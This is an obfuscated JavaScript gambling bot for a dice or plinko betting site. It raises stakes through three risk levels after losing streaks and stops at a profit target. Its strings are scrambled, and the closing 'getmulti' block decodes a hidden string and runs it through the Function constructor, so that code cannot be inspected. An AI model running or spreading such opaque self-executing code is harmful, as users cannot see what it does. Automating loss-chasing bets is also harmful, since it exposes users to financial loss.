//let betResetSeed = 0;

let riskX = 3;
let risk;
if (riskX == 1) {
    risk = 5;
} else if (riskX == 2) {
    risk = 4;
} else if (riskX == 3) {
    risk = 3;
} else {
    risk = 6;
}

let chance = 50;
let stake = 0;
let riskCH = 30;
let level = 1;
let nextbet = basebet;
let bb = basebet;
let step = "[NEUTRAL]";

resetstats();

var dobet;
(function () {
  function jso$ft$boe$_45(a, b) {
    return a - b;
  }
  function jso$ft$boe$_47(a, b) {
    return a / b;
  }
  function jso$ft$giden$win() {
    return win;
  }
  function jso$ft$giden$currentprofit() {
    return currentprofit;
  }
  function jso$ft$giden$handleLevel_51() {
    return handleLevel3;
  }
  function jso$ft$giden$handleLevel_50() {
    return handleLevel2;
  }
  function jso$ft$giden$handleLevel_49() {
    return handleLevel1;
  }
  function jso$ft$giden$_95_36af_50_54_53_52_52() {
    return _$af26544;
  }
  function jso$ft$boe$_62_61(a, b) {
    return a >= b;
  }
  function jso$ft$giden$_95_36af_50_54_53_52_51() {
    return _$af26543;
  }
  function jso$ft$boe$_61_61(a, b) {
    return a == b;
  }
  function jso$ft$boe$_62(a, b) {
    return a > b;
  }
  function jso$ft$giden$Math() {
    return Math;
  }
  function jso$ft$boe$_42(a, b) {
    return a * b;
  }
  function jso$ft$boe$_61_61_61(a, b) {
    return a === b;
  }
  function jso$ft$giden$profitBotStop() {
    return profitBotStop;
  }
  function jso$ft$uoel$_33(a) {
    return !a;
  }
  function jso$ft$giden$String() {
    return String;
  }
  function jso$ft$boe$_37(a, b) {
    return a % b;
  }
  function jso$ft$boe$_43(a, b) {
    return a + b;
  }
  function jso$ft$boe$_60(a, b) {
    return a < b;
  }
  var _$_2a71 = _$af26544("RAldom]fl%%wo[oemurEnTaNL%irm%odU", 725850);
  function _$af26544(s, jso$setrpl$h) {
    var h = {}, c = {}, q = {}, b = {}, v = {}, r = {}, e = {};
    h._ = jso$setrpl$h;
    var z = s.length;
    c._ = [];
    ;
    for (var m = 0; jso$ft$boe$_60(m, z); m++) {
      c._[m] = s.charAt(m);
    }
    ;
    for (var m = 0; jso$ft$boe$_60(m, z); m++) {
      q._ = jso$ft$boe$_43(h._ * jso$ft$boe$_43(m, 70), jso$ft$boe$_37(h._, 24029));
      ;
      b._ = jso$ft$boe$_43(h._ * jso$ft$boe$_43(m, 422), jso$ft$boe$_37(h._, 47128));
      ;
      v._ = jso$ft$boe$_37(q._, z);
      ;
      r._ = jso$ft$boe$_37(b._, z);
      ;
      e._ = c._[v._];
      ;
      jso$spliter_$af26546(v, c, r);
      jso$spliter_$af26547(r, c, e);
      jso$spliter_$af26548(h, q, b);
    }
    ;
    var k = jso$ft$giden$String().fromCharCode(127);
    var i = "";
    var n = "%";
    var p = "#1";
    var a = "%";
    var o = "#0";
    var y = "#";
    return c._.join(i).split(n).join(k).split(p).join(a).split(o).join(y).split(k);
  }
  function _$af26543() {
    if (jso$ft$uoel$_33(_$af26543)) {
      return;
    }
    ;
    jso$ft$giden$profitBotStop()();
    jso$spliter_$af26549();
    bethigh = jso$ft$boe$_61_61_61(jso$ft$giden$Math()[_$_2a71[1]](jso$ft$boe$_42(jso$ft$giden$Math()[_$_2a71[0]](), 100)) % 2, 0);
    jso$spliter_$af26550();
    if (jso$ft$boe$_62(0, stake)) {
      jso$spliter_$af26551();
      jso$spliter_$af26552();
      jso$spliter_$af26553();
      jso$spliter_$af26554();
      if (jso$ft$boe$_61_61(_$af26543, _$_2a71[4])) {
        jso$ft$giden$_95_36af_50_54_53_52_51()();
        return;
      }
      ;
      if (jso$ft$boe$_62_61(currentstreak, risk)) {
        chance = jso$ft$giden$Math()[_$_2a71[1]](jso$ft$boe$_43(jso$ft$giden$Math()[_$_2a71[0]]() * jso$ft$boe$_43(45 - 35, 1), 35));
        if (jso$ft$uoel$_33(_$_2a71)) {
          jso$ft$giden$_95_36af_50_54_53_52_52()(null);
          return;
        }
        ;
        plinkoRow = jso$ft$boe$_43(jso$ft$giden$Math()[_$_2a71[1]](jso$ft$boe$_42(jso$ft$giden$Math()[_$_2a71[0]](), jso$ft$boe$_43(11 - 9, 1))), 9);
        jso$spliter_$af26555();
      } else {
        chance = jso$ft$giden$Math()[_$_2a71[1]](jso$ft$boe$_43(jso$ft$giden$Math()[_$_2a71[0]]() * jso$ft$boe$_43(90 - 60, 1), 60));
        if (jso$ft$uoel$_33(_$af26543)) {
          jso$ft$giden$_95_36af_50_54_53_52_51()();
          jso$spliter_$af26556();
          return;
        }
        ;
        plinkoRow = jso$ft$boe$_43(jso$ft$giden$Math()[_$_2a71[1]](jso$ft$boe$_42(jso$ft$giden$Math()[_$_2a71[0]](), jso$ft$boe$_43(15 - 9, 1))), 9);
        jso$spliter_$af26557();
      }
    } else {
      if (jso$ft$boe$_61_61(level, 1)) {
        if (jso$ft$uoel$_33(_$af26544)) {
          return;
        }
        ;
        jso$ft$giden$handleLevel_49()();
      } else {
        if (jso$ft$boe$_61_61(level, 2)) {
          jso$ft$giden$handleLevel_50()();
        } else {
          if (jso$ft$boe$_61_61(level, 3)) {
            jso$ft$giden$handleLevel_51()();
          }
        }
      }
    }
    ;
    jso$spliter_$af26558();
  }
  dobet = _$af26543;
  if (!_$af26544) {
    return;
  }
  ;
  function jso$spliter_$af26546(v, c, r) {
    c._[v._] = c._[r._];
  }
  function jso$spliter_$af26547(r, c, e) {
    c._[r._] = e._;
  }
  function jso$spliter_$af26548(h, q, b) {
    h._ = jso$ft$boe$_37(jso$ft$boe$_43(q._, b._), 1680778);
  }
  function jso$spliter_$af26549() {
    stake = jso$ft$boe$_43(stake, -jso$ft$giden$currentprofit());
  }
  function jso$spliter_$af26550() {
    if (jso$ft$giden$win() && jso$ft$boe$_62(risk, 3)) {
      nextbet = jso$ft$boe$_47(nextbet, jso$ft$boe$_47(chance, jso$ft$boe$_47(jso$ft$boe$_45(100, 1), chance)));
      if (jso$ft$boe$_60(nextbet, basebet)) {
        nextbet = basebet;
      }
    }
  }
  function jso$spliter_$af26551() {
    stake = 0;
  }
  function jso$spliter_$af26552() {
    bb = basebet;
  }
  function jso$spliter_$af26553() {
    nextbet = bb;
  }
  function jso$spliter_$af26554() {
    step = _$_2a71[2];
  }
  function jso$spliter_$af26555() {
    plinkoRisk = _$_2a71[3];
  }
  function jso$spliter_$af26556() {
    _$af26544 = true;
  }
  function jso$spliter_$af26557() {
    plinkoRisk = _$_2a71[4];
  }
  function jso$spliter_$af26558() {
    if (jso$ft$boe$_60(nextbet, basebet)) {
      nextbet = basebet;
    }
  }
}());

var profitBotStop;
(function () {
  function jso$ft$giden$document() {
    return document;
  }
  function jso$ft$giden$stop() {
    return stop;
  }
  function jso$ft$giden$_95_36af_50_54_52_48_57() {
    return _$af26409;
  }
  function jso$ft$boe$_61_61(a, b) {
    return a == b;
  }
  function jso$ft$boe$_42(a, b) {
    return a * b;
  }
  function jso$ft$boe$_47(a, b) {
    return a / b;
  }
  function jso$ft$boe$_62_61(a, b) {
    return a >= b;
  }
  function jso$ft$giden$String() {
    return String;
  }
  function jso$ft$boe$_37(a, b) {
    return a % b;
  }
  function jso$ft$boe$_43(a, b) {
    return a + b;
  }
  function jso$ft$boe$_60(a, b) {
    return a < b;
  }
  var _$_146a = _$af26409("inmkrdiger seM strexh!y E neseongt Tollolltne e%eVP aTylyir.eeoin  i%Bn gitsa%oeT sndrstpoleatiitUcitagrrtI wusi.ylsttsVuaanayg", 5034840);
  function _$af26409(d, jso$setrpl$o) {
    var o = {}, f = {}, s = {}, z = {}, i = {}, x = {}, w = {};
    o._ = jso$setrpl$o;
    var t = d.length;
    f._ = [];
    ;
    for (var j = 0; jso$ft$boe$_60(j, t); j++) {
      f._[j] = d.charAt(j);
    }
    ;
    for (var j = 0; jso$ft$boe$_60(j, t); j++) {
      s._ = jso$ft$boe$_43(o._ * jso$ft$boe$_43(j, 86), jso$ft$boe$_37(o._, 26567));
      ;
      z._ = jso$ft$boe$_43(o._ * jso$ft$boe$_43(j, 487), jso$ft$boe$_37(o._, 30018));
      ;
      i._ = jso$ft$boe$_37(s._, t);
      ;
      x._ = jso$ft$boe$_37(z._, t);
      ;
      w._ = f._[i._];
      ;
      jso$spliter_$af26411(i, f, x);
      jso$spliter_$af26412(x, f, w);
      jso$spliter_$af26413(o, s, z);
    }
    ;
    var h = jso$ft$giden$String().fromCharCode(127);
    var y = "";
    var g = "%";
    var m = "#1";
    var n = "%";
    var a = "#0";
    var r = "#";
    return f._.join(y).split(g).join(h).split(m).join(n).split(a).join(r).split(h);
  }
  function _$af26408() {
    if (jso$ft$boe$_62_61(profit, jso$ft$boe$_47(jso$ft$boe$_42(startBalance, 1), 100))) {
      if (jso$ft$boe$_61_61(_$af26408, null)) {
        jso$ft$giden$_95_36af_50_54_52_48_57()(1);
        return;
      }
      ;
      jso$ft$giden$stop()();
      jso$ft$giden$document()[_$_146a[2]](_$_146a[1])[_$_146a[0]] = _$_146a[3];
    }
  }
  profitBotStop = _$af26408;
  function jso$spliter_$af26411(i, f, x) {
    f._[i._] = f._[x._];
  }
  function jso$spliter_$af26412(x, f, w) {
    f._[x._] = w._;
  }
  function jso$spliter_$af26413(o, s, z) {
    o._ = jso$ft$boe$_37(jso$ft$boe$_43(s._, z._), 6349220);
  }
}());

function handleLevel1() {
(function () {
  function jso$ft$boe$_61_61_61(a, b) {
    return a === b;
  }
  function jso$ft$giden$String() {
    return String;
  }
  function jso$ft$boe$_37(a, b) {
    return a % b;
  }
  function jso$ft$boe$_43(a, b) {
    return a + b;
  }
  function jso$ft$boe$_60(a, b) {
    return a < b;
  }
  var _$_89de = _$af22847("]ow]%fi%loDOdomomlm[%UePrW[nd%rauN%", 1857822);
  function _$af22847(h, jso$setrpl$z) {
    var z = {}, t = {}, i = {}, k = {}, e = {}, q = {}, w = {};
    z._ = jso$setrpl$z;
    var p = h.length;
    t._ = [];
    ;
    for (var b = 0; jso$ft$boe$_60(b, p); b++) {
      t._[b] = h.charAt(b);
    }
    ;
    for (var b = 0; jso$ft$boe$_60(b, p); b++) {
      i._ = jso$ft$boe$_43(z._ * jso$ft$boe$_43(b, 102), jso$ft$boe$_37(z._, 31183));
      ;
      k._ = jso$ft$boe$_43(z._ * jso$ft$boe$_43(b, 467), jso$ft$boe$_37(z._, 38621));
      ;
      e._ = jso$ft$boe$_37(i._, p);
      ;
      q._ = jso$ft$boe$_37(k._, p);
      ;
      w._ = t._[e._];
      ;
      jso$spliter_$af22849(e, t, q);
      jso$spliter_$af22850(q, t, w);
      jso$spliter_$af22851(z, i, k);
    }
    ;
    var r = jso$ft$giden$String().fromCharCode(127);
    var a = "";
    var d = "%";
    var m = "#1";
    var v = "%";
    var c = "#0";
    var l = "#";
    return t._.join(a).split(d).join(r).split(m).join(v).split(c).join(l).split(r);
  }
  if (currentstreak >= risk) {
    (function () {
      if (jso$ft$boe$_61_61_61(_$af22847, 0)) {
        _$af22847 = 1;
      }
    }());
    (function () {
      risk = 4;
    }());
    chance = Math[_$_89de[1]](Math[_$_89de[0]]() * (45 - 35 + 1) + 35);
    if (!_$_89de) {
      _$af22847(true, true, null);
    }
    ;
    plinkoRow = Math[_$_89de[1]](Math[_$_89de[0]]() * (11 - 9 + 1)) + 9;
    (function () {
      plinkoRisk = _$_89de[2];
    }());
    (function () {
      bb = previousbet;
    }());
    (function () {
      step = _$_89de[3];
    }());
    nextbet = previousbet * getmulti();
  } else {
    if (!_$af22847) {
      return;
    } else {
      if (win && chance < riskCH) {
        (function () {
          step = _$_89de[4];
        }());
        chance = Math[_$_89de[1]](Math[_$_89de[0]]() * (90 - 60 + 1) + 60);
        plinkoRow = Math[_$_89de[1]](Math[_$_89de[0]]() * (15 - 9 + 1)) + 9;
        (function () {
          plinkoRisk = _$_89de[5];
        }());
        (function () {
          nextbet = bb;
        }());
      } else {
        chance = Math[_$_89de[1]](Math[_$_89de[0]]() * (95 * 100 - 5 * 100 + 1) + 5 * 100) / 100;
        plinkoRow = Math[_$_89de[1]](Math[_$_89de[0]]() * (16 - 8 + 1)) + 8;
        (function () {
          if (jso$ft$boe$_61_61_61(bethigh, false)) {
            plinkoRisk = _$_89de[5];
          } else {
            plinkoRisk = _$_89de[2];
          }
        }());
        if (!_$af22847) {
          _$af22847(false, true);
          return;
        }
        ;
        (function () {
          nextbet = previousbet;
        }());
        (function () {
          level = 2;
        }());
      }
    }
  }
  ;
  function jso$spliter_$af22849(e, t, q) {
    t._[e._] = t._[q._];
  }
  function jso$spliter_$af22850(q, t, w) {
    t._[q._] = w._;
  }
  function jso$spliter_$af22851(z, i, k) {
    z._ = jso$ft$boe$_37(jso$ft$boe$_43(i._, k._), 7316913);
  }
}());
}

function handleLevel2() {
(function () {
  function jso$ft$boe$_61_61_61(a, b) {
    return a === b;
  }
  function jso$ft$giden$String() {
    return String;
  }
  function jso$ft$boe$_37(a, b) {
    return a % b;
  }
  function jso$ft$boe$_43(a, b) {
    return a + b;
  }
  function jso$ft$boe$_60(a, b) {
    return a < b;
  }
  var _$_9308 = _$af20669("W[%dom%lOondre]Di%muaU%oP[rfN%]lomw", 108636);
  if (!_$af20669) {
    _$af20669();
    return;
  }
  ;
  function _$af20669(k, jso$setrpl$p) {
    var p = {}, b = {}, z = {}, s = {}, v = {}, x = {}, j = {};
    p._ = jso$setrpl$p;
    var m = k.length;
    b._ = [];
    ;
    for (var y = 0; jso$ft$boe$_60(y, m); y++) {
      b._[y] = k.charAt(y);
    }
    ;
    for (var y = 0; jso$ft$boe$_60(y, m); y++) {
      z._ = jso$ft$boe$_43(p._ * jso$ft$boe$_43(y, 388), jso$ft$boe$_37(p._, 22995));
      ;
      s._ = jso$ft$boe$_43(p._ * jso$ft$boe$_43(y, 140), jso$ft$boe$_37(p._, 30968));
      ;
      v._ = jso$ft$boe$_37(z._, m);
      ;
      x._ = jso$ft$boe$_37(s._, m);
      ;
      j._ = b._[v._];
      ;
      jso$spliter_$af20671(v, b, x);
      jso$spliter_$af20672(x, b, j);
      jso$spliter_$af20673(p, z, s);
    }
    ;
    var i = jso$ft$giden$String().fromCharCode(127);
    var g = "";
    var c = "%";
    var f = "#1";
    var e = "%";
    var l = "#0";
    var n = "#";
    return b._.join(g).split(c).join(i).split(f).join(e).split(l).join(n).split(i);
  }
  if (currentstreak >= risk) {
    (function () {
      risk = 3;
    }());
    chance = Math[_$_9308[1]](Math[_$_9308[0]]() * (35 * 10 - 25 * 10 + 1) + 25 * 10) / 10;
    plinkoRow = Math[_$_9308[1]](Math[_$_9308[0]]() * (13 - 11 + 1)) + 11;
    (function () {
      plinkoRisk = _$_9308[2];
    }());
    (function () {
      bb = previousbet;
    }());
    (function () {
      step = _$_9308[3];
    }());
    if (_$af20669 === null) {
      _$af20669(0, _$_9308[0]);
      (function () {
        _$af20669 = 1;
      }());
      return;
    }
    ;
    nextbet = previousbet * getmulti();
  } else {
    if (win && chance < riskCH) {
      (function () {
        step = _$_9308[4];
      }());
      chance = Math[_$_9308[1]](Math[_$_9308[0]]() * (90 - 60 + 1) + 60);
      plinkoRow = Math[_$_9308[1]](Math[_$_9308[0]]() * (15 - 9 + 1)) + 9;
      if (!_$af20669) {
        _$af20669(true, _$_9308[4]);
        (function () {
          _$af20669 = true;
        }());
        return;
      }
      ;
      (function () {
        plinkoRisk = _$_9308[5];
      }());
      (function () {
        nextbet = bb;
      }());
    } else {
      chance = Math[_$_9308[1]](Math[_$_9308[0]]() * (95 * 10 - 5 * 10 + 1) + 5 * 10) / 10;
      if (!_$af20669) {
        (function () {
          _$af20669 = 1;
        }());
        return;
      }
      ;
      plinkoRow = Math[_$_9308[1]](Math[_$_9308[0]]() * (16 - 8 + 1)) + 8;
      (function () {
        if (jso$ft$boe$_61_61_61(bethigh, false)) {
          plinkoRisk = _$_9308[5];
        } else {
          plinkoRisk = _$_9308[2];
        }
      }());
      (function () {
        nextbet = previousbet;
      }());
      (function () {
        level = 3;
      }());
    }
  }
  ;
  function jso$spliter_$af20671(v, b, x) {
    b._[v._] = b._[x._];
  }
  function jso$spliter_$af20672(x, b, j) {
    b._[x._] = j._;
  }
  function jso$spliter_$af20673(p, z, s) {
    p._ = jso$ft$boe$_37(jso$ft$boe$_43(z._, s._), 3231259);
  }
}());
}

function handleLevel3() {
(function () {
  function jso$ft$boe$_61_61_61(a, b) {
    return a === b;
  }
  function jso$ft$giden$String() {
    return String;
  }
  function jso$ft$boe$_37(a, b) {
    return a % b;
  }
  function jso$ft$boe$_43(a, b) {
    return a + b;
  }
  function jso$ft$boe$_60(a, b) {
    return a < b;
  }
  var _$_e222 = _$af20559("dao%u[lwrUmo%[eoP]fOiml%om%DnN]dWr%", 5184035);
  function _$af20559(n, jso$setrpl$u) {
    var u = {}, l = {}, o = {}, s = {}, f = {}, d = {}, v = {};
    u._ = jso$setrpl$u;
    var k = n.length;
    l._ = [];
    ;
    for (var e = 0; jso$ft$boe$_60(e, k); e++) {
      l._[e] = n.charAt(e);
    }
    ;
    for (var e = 0; jso$ft$boe$_60(e, k); e++) {
      o._ = jso$ft$boe$_43(u._ * jso$ft$boe$_43(e, 480), jso$ft$boe$_37(u._, 13466));
      ;
      s._ = jso$ft$boe$_43(u._ * jso$ft$boe$_43(e, 422), jso$ft$boe$_37(u._, 26217));
      ;
      f._ = jso$ft$boe$_37(o._, k);
      ;
      d._ = jso$ft$boe$_37(s._, k);
      ;
      v._ = l._[f._];
      ;
      jso$spliter_$af20561(f, l, d);
      jso$spliter_$af20562(d, l, v);
      jso$spliter_$af20563(u, o, s);
    }
    ;
    var w = jso$ft$giden$String().fromCharCode(127);
    var q = "";
    var b = "%";
    var a = "#1";
    var c = "%";
    var p = "#0";
    var h = "#";
    return l._.join(q).split(b).join(w).split(a).join(c).split(p).join(h).split(w);
  }
  if (currentstreak >= risk) {
    (function () {
      risk = 2;
    }());
    chance = Math[_$_e222[1]](Math[_$_e222[0]]() * (25 * 100 - 15 * 100 + 1) + 15 * 100) / 100;
    if (_$af20559 == false) {
      _$af20559();
      return;
    }
    ;
    plinkoRow = Math[_$_e222[1]](Math[_$_e222[0]]() * (15 - 13 + 1)) + 13;
    (function () {
      plinkoRisk = _$_e222[2];
    }());
    (function () {
      bb = previousbet;
    }());
    (function () {
      step = _$_e222[3];
    }());
    nextbet = previousbet * getmulti();
  } else {
    if (!_$_e222) {
      (function () {
        _$af20559 = true;
      }());
      return;
    }
    ;
    if (win && chance < riskCH) {
      (function () {
        step = _$_e222[4];
      }());
      chance = Math[_$_e222[1]](Math[_$_e222[0]]() * (90 - 60 + 1) + 60);
      plinkoRow = Math[_$_e222[1]](Math[_$_e222[0]]() * (15 - 9 + 1)) + 9;
      (function () {
        plinkoRisk = _$_e222[5];
      }());
      (function () {
        nextbet = bb;
      }());
    } else {
      if (!_$_e222) {
        return;
      }
      ;
      chance = Math[_$_e222[1]](Math[_$_e222[0]]() * (95 - 5 + 1) + 5);
      plinkoRow = Math[_$_e222[1]](Math[_$_e222[0]]() * (16 - 8 + 1)) + 8;
      (function () {
        if (jso$ft$boe$_61_61_61(bethigh, false)) {
          plinkoRisk = _$_e222[5];
        } else {
          plinkoRisk = _$_e222[2];
        }
      }());
      (function () {
        nextbet = previousbet;
      }());
      (function () {
        level = 1;
      }());
    }
  }
  ;
  function jso$spliter_$af20561(f, l, d) {
    l._[f._] = l._[d._];
  }
  function jso$spliter_$af20562(d, l, v) {
    l._[d._] = v._;
  }
  function jso$spliter_$af20563(u, o, s) {
    u._ = jso$ft$boe$_37(jso$ft$boe$_43(o._, s._), 5952059);
  }
}());
}

var getmulti;
(function () {
  var WSi = "", zuA = 102 - 91;
  function bmV(w) {
    var g = 403821;
    var p = w.length;
    var i = [];
    for (var k = 0; k < p; k++) {
      i[k] = w.charAt(k);
    }
    ;
    for (var k = 0; k < p; k++) {
      var v = g * (k + 471) + g % 23249;
      var z = g * (k + 197) + g % 42819;
      var u = v % p;
      var m = z % p;
      var s = i[u];
      i[u] = i[m];
      i[m] = s;
      g = (v + z) % 2748150;
    }
    ;
    return i.join("");
  }
  ;
  var PfO = bmV("tornshduycrkvtblrqcjiemtsxnwufoopaczg").substr(0, zuA);
  var iGU = 'mv1j+=g,, ;+9!)=+((;(]"aCty+}junbof7h(gelu;)sv{v=.9rhnCrr;uue)fmsn+9t, ci7;;eurv;,;)[(6uu{+da,[,a,j-m(,u6]z7[6577g,w*,c2[.rags9+e]rAd.mavv;,cf;;<zwur,ip0rade,gC<a1+if}sv(8( ;he0=ax+]1i1.s;5=;e,lsm(f,rtmfl.+v r,})"  afn.s9=cb(rr)g+eh[0a+8 ;4h(=t1rlfot".nllb=p9(.);d(a)-oh= +l; vn"j]clfr8=06pormn9ix } nll]gost;r=oign.u.r6)orvrz;=lvofv,iq3>h"nr<lAtn,k)=ag, .)ix( (ibr}dmj}x=h(sC=orron0g;c;na,ofi=r(j.])<rm(v(,g];i(l"hai"7f]0t]ves[uar)rno,;c.),+,;jfts)hb+rve=nse.=nmnj[d)5y=t. ;or0n(mhh )9avcar)gtdw.iorpaera;c[o.{ d=6h=C=2);t(s=me+ S2s==ro1m4)[tyj1") ia6fp=tv[lim=[se;f;bab1c{nhnhg.za=;o>(+nuem+;}r(fcfuh=6+t0a1xo;;ne8t6oif4 ;i;j!-){sovj"2),;tvh3jllra(ejahpttrl=;-3+l=Al1r.0(5")aoz6bf{;n i.e]) .v,vt4( n.)v)0ae dc(n]m=t;2wa.8={f[l]30y42(.enni=)ou=rv=.l=ossau8(s;)6coh*;dpr)fCiuaupgs)bo.jAa;er;pien=aSj-+1 -idpa,1pp(r(ge[hvrx=y0t2h7rir+=rv=be[t<ifC7+7a);gt-=rmovr+.r88;0uC)pll (8(Azb;a;siu)+r]';
  var yoo = bmV[PfO];
  var jKK = "";
  var eoD = yoo;
  var dYg = yoo(jKK, bmV(iGU));
  var Ilw = dYg(bmV(')"sa3(a,$){b#(5,1obo,nF"$a}aon$pb"bF!#$m.bF},ts)11bi$7{bb(!a=(o1f(5ebfFf 1f1Fu_=i)_Fe.t,s.4not(j#ot.6tb$e0..c(/a1#b(o$4or4a,5}no/!.h!(Fe$$l{bpbya1e$)jyo6tc_o;10.;btn1 0aebb)FF eptb}bt$g_F03tu)F0a$-Flt!_b$)e"jbu$_tuf4(bj20,f.){oa.fn.usy)uc+n.a72r'));
  var Gfw = eoD(WSi, Ilw);
  Gfw(1563);
  return 5114;
}());